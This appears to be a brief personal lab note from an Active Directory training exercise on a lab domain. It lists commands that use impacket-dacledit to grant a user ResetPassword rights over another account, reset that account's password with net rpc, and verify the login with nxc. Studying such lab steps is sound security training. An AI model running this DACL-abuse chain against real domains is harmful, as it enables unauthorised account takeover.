```shell
impacket-dacledit -principal lilia -target 'Kendra' -dc-ip 10.129.205.81 inlanefreight.local/lilia:DACLPass123 -action write -rights ResetPassword
```
![[Pasted image 20251230184618.png]]
##### Reset Password
```shell
net rpc password kendra NewP@ssward123 -U inlanefreight.local/lilia%DACLPass123 -S 10.129.205.81
```
##### Verify
```shell
nxc smb 10.129.205.81 -u kendra -p NewP@ssward123
```
